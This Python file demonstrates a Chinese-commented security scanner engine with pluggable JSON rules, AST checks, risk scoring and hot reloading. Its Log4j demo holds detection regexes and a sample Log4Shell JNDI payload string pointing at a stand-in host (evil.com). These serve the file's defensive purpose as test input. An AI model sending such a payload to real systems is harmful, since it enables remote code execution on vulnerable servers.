"""
Truffle Security Engine — 规则与引擎分离演示
=============================================
用法：  python engine.py [要扫描的代码文件] [语言]

这个引擎从 rules/ 目录加载规则文件（JSON），
而不是把规则硬编码在 Python 代码里。
"""

import json
import ast
import re
import sys
import os
from pathlib import Path
from typing import Any


# ── 风险等级权重 ──────────────────────────────────────────────────────────
RISK_WEIGHTS = {
    "critical": 40,
    "high": 20,
    "medium": 10,
    "low": 5,
    "info": 0,
}


# ── 引擎核心：加载规则 ────────────────────────────────────────────────────
class RuleEngine:
    def __init__(self, rules_dir: str = "rules"):
        self.rules_dir = Path(rules_dir)
        self.rules: list[dict] = []
        self.rule_index: dict[str, dict] = {}  # rule_id → rule
        self._load_rules()

    def _load_rules(self):
        """从 rules/ 目录加载所有 JSON 规则文件"""
        if not self.rules_dir.exists():
            print(f"  ❌ 规则目录 {self.rules_dir} 不存在")
            return

        for f in sorted(self.rules_dir.glob("*.json")):
            try:
                rule = json.loads(f.read_text(encoding="utf-8"))
                self.rules.append(rule)
                self.rule_index[rule["rule_id"]] = rule
            except Exception as e:
                print(f"  ⚠️  加载规则文件 {f.name} 失败: {e}")

        print(f"  ✅ 加载了 {len(self.rules)} 个规则文件")

    def reload(self):
        """热重载规则（模拟更新）"""
        print("\n  🔄 正在检查规则更新...")
        old_count = len(self.rules)
        self.rules.clear()
        self.rule_index.clear()
        self._load_rules()
        print(f"  ✅ 规则已更新: {old_count} → {len(self.rules)} 个规则\n")

    def get_rules_for_language(self, language: str) -> list[dict]:
        """获取适用于指定语言的规则"""
        return [r for r in self.rules if language in r.get("languages", [])]


# ── 扫描器 ─────────────────────────────────────────────────────────────────
class Scanner:
    def __init__(self, engine: RuleEngine):
        self.engine = engine

    def scan(self, code: str, language: str) -> dict:
        """扫描代码，返回安全报告"""
        findings = []
        rules = self.engine.get_rules_for_language(language)

        for rule in rules:
            match_type = rule.get("match_type", "regex")

            if match_type == "regex":
                findings.extend(self._scan_regex(rule, code))
            elif match_type == "ast_call" and language == "python":
                findings.extend(self._scan_ast(rule, code))

        # 计算总分
        score = min(sum(RISK_WEIGHTS.get(f["severity"], 0) for f in findings), 100)

        # 判定等级
        if score == 0:
            verdict = "safe"
            label = "✅ Safe — 未发现安全问题"
        elif score <= 20:
            verdict = "minor"
            label = "🟡 Minor — 存在少量低风险问题"
        elif score <= 60:
            verdict = "review"
            label = "🟠 Needs Review — 建议审查后再使用"
        else:
            verdict = "dangerous"
            label = "🔴 Dangerous — 存在严重安全风险"

        return {
            "score": score,
            "verdict": verdict,
            "verdict_label": label,
            "findings_count": len(findings),
            "findings": findings,
            "scanned_lines": len(code.splitlines()),
        }

    def _scan_regex(self, rule: dict, code: str) -> list[dict]:
        """正则匹配模式扫描"""
        findings = []
        for pattern in rule.get("patterns", []):
            for match in re.finditer(pattern, code):
                line = code[:match.start()].count("\n") + 1
                findings.append({
                    "rule_id": rule["rule_id"],
                    "name": rule["name"],
                    "severity": rule["severity"],
                    "category": rule.get("category", ""),
                    "description": rule["description"],
                    "recommendation": rule["recommendation"],
                    "line": line,
                    "snippet": match.group()[:100],
                })
        return findings

    def _scan_ast(self, rule: dict, code: str) -> list[dict]:
        """AST 抽象语法树扫描（仅 Python）"""
        findings = []
        try:
            tree = ast.parse(code)
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    func_name = self._get_call_name(node)
                    if func_name and func_name in rule.get("functions", {}):
                        line = getattr(node, "lineno", None)
                        snippet = code.splitlines()[line - 1].strip() if line else ""
                        findings.append({
                            "rule_id": rule["rule_id"],
                            "name": f"危险函数: {func_name}()",
                            "severity": rule["severity"],
                            "category": rule.get("category", ""),
                            "description": rule["functions"][func_name],
                            "recommendation": rule["recommendation"],
                            "line": line,
                            "snippet": snippet,
                        })
        except SyntaxError:
            pass  # 语法错误跳过 AST 扫描
        return findings

    def _get_call_name(self, node: ast.Call) -> str | None:
        """提取 AST Call 节点的完整函数名"""
        if isinstance(node.func, ast.Name):
            return node.func.id
        elif isinstance(node.func, ast.Attribute):
            parts = []
            current = node.func
            while isinstance(current, ast.Attribute):
                parts.append(current.attr)
                current = current.value
            if isinstance(current, ast.Name):
                parts.append(current.id)
            else:
                return None
            return ".".join(reversed(parts))
        return None


# ── 报告生成 ───────────────────────────────────────────────────────────────
def print_report(result: dict):
    """打印人类可读的安全报告"""
    print(f"\n{'='*60}")
    print(f"  Truffle Security Report")
    print(f"{'='*60}")
    print(f"  扫描行数: {result['scanned_lines']} 行")
    print(f"  发现问题: {result['findings_count']} 个")
    print(f"  安全评分: {result['score']}/100")
    print(f"  综合裁定: {result['verdict_label']}")
    print(f"{'='*60}")

    if result["findings"]:
        print(f"\n  📋 发现的问题:\n")
        for i, f in enumerate(result["findings"], 1):
            sev_icon = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🔵", "info": "⚪"}
            icon = sev_icon.get(f["severity"], "⚪")
            print(f"  {i}. {icon} [{f['severity'].upper()}] {f['name']}")
            print(f"     行号: {f['line']}")
            print(f"     说明: {f['description']}")
            print(f"     代码: {f['snippet']}")
            print(f"     建议: {f['recommendation']}")
            print()
    else:
        print(f"\n  ✅ 代码看起来是安全的，没有发现问题\n")


# ── 主入口 ─────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"\n{'='*60}")
    print(f"  🚀  Truffle Security Engine Demo")
    print(f"  规则与引擎分离架构 · 可插拔规则系统")
    print(f"{'='*60}\n")

    # 初始化引擎（从 rules/ 目录加载规则）
    print("  📦 正在初始化引擎...")
    engine = RuleEngine("rules")
    scanner = Scanner(engine)

    # 要扫描的代码
    code_samples = [
        ("python", Path(__file__).parent / "samples" / "unsafe_app.py"),
        ("python", Path(__file__).parent / "samples" / "safe_app.py"),
    ]

    for lang, path in code_samples:
        if path.exists():
            print(f"\n  {'─'*56}")
            print(f"  扫描文件: {path.name}")
            print(f"{'─'*56}\n")
            code = path.read_text(encoding="utf-8")

            # 显示前几行
            lines = code.splitlines()
            print(f"  📄 代码总览（前 10 行）:")
            for i, line in enumerate(lines[:10], 1):
                print(f"    {i:3d} | {line}")
            if len(lines) > 10:
                print(f"    ... 共 {len(lines)} 行\n")

            # 执行扫描
            result = scanner.scan(code, lang)
            print_report(result)

    # ── 演示 1：添加新规则 → 立刻生效 ──────────────────────────────────
    print(f"\n{'='*60}")
    print(f"  🎯 演示: 添加新规则 = 放一个 JSON 文件")
    print(f"{'='*60}\n")

    print(f"  场景: 最近 Log4j 漏洞爆发，需要紧急检测")
    print(f"  操作: 新建 rules/log4j-detection.json\n")

    log4j_rule = {
        "rule_id": "TRUFFLE-LOG4J-001",
        "name": "Log4j JNDI Injection Detection",
        "severity": "critical",
        "languages": ["python", "javascript", "go", "cpp"],
        "match_type": "regex",
        "patterns": [
            "\\$\\{jndi:",
            "JndiLookup",
            "org\\.apache\\.logging\\.log4j"
        ],
        "description": "检测到 Log4j JNDI 注入模式，存在远程代码执行风险（CVE-2021-44228）",
        "recommendation": "升级 Log4j 到 2.17.0+，或移除 JNDI lookup 功能",
        "category": "Critical Vulnerability"
    }

    rule_path = Path("rules") / "log4j-detection.json"
    rule_path.write_text(json.dumps(log4j_rule, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"  ✅ 规则文件已创建: {rule_path}")

    # 热重载
    engine.reload()

    # 扫描包含 Log4j 漏洞的代码
    log4j_code = '''
importorg.apache.logging.log4j.core.lookup.JndiLookup;

public class App {
    public static void main(String[] args) {
        String userInput = "${jndi:ldap://evil.com/exploit}";
        System.out.println("Processing: " + userInput);
    }
}
'''
    print(f"  📄 扫描包含 Log4j 漏洞的 Java 代码...")
    # 用所有语言规则扫（含 critical）
    for lang in ["python", "javascript", "go", "cpp"]:
        result = scanner.scan(log4j_code, lang)
        if result["findings"]:
            print(f"\n  语言: {lang} → 发现 {result['findings_count']} 个问题")
            for f in result["findings"]:
                sev_icon = {"critical": "🔴", "high": "🟠", "medium": "🟡"}
                print(f"    {sev_icon.get(f['severity'], '⚪')} 行 {f['line']}: {f['name']}")
    print()

    # ── 演示 2：QQ 式自动更新 ──────────────────────────────────────────
    print(f"{'='*60}")
    print(f"  🎯 演示: QQ 式自动更新规则包")
    print(f"{'='*60}\n")

    print(f"  场景: 云端发布了 v2026.06.02 规则更新包")
    print(f"  操作: 用户无需升级整个软件，只需要更新规则文件\n")
    print(f"  流程:")
    print(f"    1. 企业版启动时检查: GET https://update.truffle.dev/rules/latest")
    print(f"    2. 发现新版本 v2026.06.02 比本地 v2026.05.01 新")
    print(f"    3. 下载新规则包: truffle-rules-v2026.06.02.zip")
    print(f"    4. 解压到 rules/ 目录覆盖旧规则")
    print(f"    5. 调用 engine.reload() 热加载")
    print(f"    6. 下次扫描自动使用新规则 ✅\n")

    # 清理演示文件
    rule_path.unlink()
    print(f"  🧹 已清理演示规则文件: {rule_path}")

    print(f"{'='*60}")
    print(f"  ✅ 演示结束")
    print(f"  总结:")
    print(f"    • 规则 = JSON 文件 → 非技术人员也可以写")
    print(f"    • 加新检测 = 放一个新 JSON 文件")
    print(f"    • 更新 = 下载规则包覆盖 → reload()")
    print(f"    • 定制 = 给企业客户写专属规则 JSON")
    print(f"{'='*60}")
